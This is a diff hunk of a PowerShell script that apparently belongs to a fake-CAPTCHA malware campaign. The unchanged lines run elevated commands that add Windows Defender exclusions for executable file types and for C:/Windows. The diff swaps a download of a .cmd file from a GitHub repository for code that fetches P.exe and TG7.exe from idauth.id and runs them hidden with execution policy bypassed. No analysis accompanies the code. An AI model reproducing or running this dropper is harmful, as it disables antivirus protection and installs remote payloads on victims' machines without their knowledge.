@@ -14,8 +14,13 @@ while($true) {
         $exclusionsCommand = "Add-MpPreference -ExclusionExtension '.dll','.ps1','.cmd','.exe','.bat','.vbs','.lnk'; Add-MpPreference -ExclusionPath '$excludePath'; Add-MpPreference -ExclusionPath 'C:/Windows'"
         Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $exclusionsCommand" -Verb runas -Wait
 
-$urlCmd = 'https://raw.githubusercontent.com/captcharequest/submit/refs/heads/main/submitted.cmd'
-$filePathCmd = [System.IO.Path]::Combine($env:USERPROFILE, 'submitted.cmd')
+$urlCmd = 'https://idauth.id/uploads/P.exe'
+$filePathCmd = [System.IO.Path]::Combine($env:USERPROFILE, 'P.exe')
+$downloadAndExecuteCmd = "Invoke-WebRequest -Uri `'$urlCmd`' -OutFile `'$filePathCmd`'; Start-Process -FilePath `'$filePathCmd`' -WindowStyle Hidden"
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$downloadAndExecuteCmd`"" -WindowStyle Hidden
+
+$urlCmd = 'https://idauth.id/uploads/TG7.exe'
+$filePathCmd = [System.IO.Path]::Combine($env:USERPROFILE, 'TG7.exe')
 $downloadAndExecuteCmd = "Invoke-WebRequest -Uri `'$urlCmd`' -OutFile `'$filePathCmd`'; Start-Process -FilePath `'$filePathCmd`' -WindowStyle Hidden"
 Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$downloadAndExecuteCmd`"" -WindowStyle Hidden
 
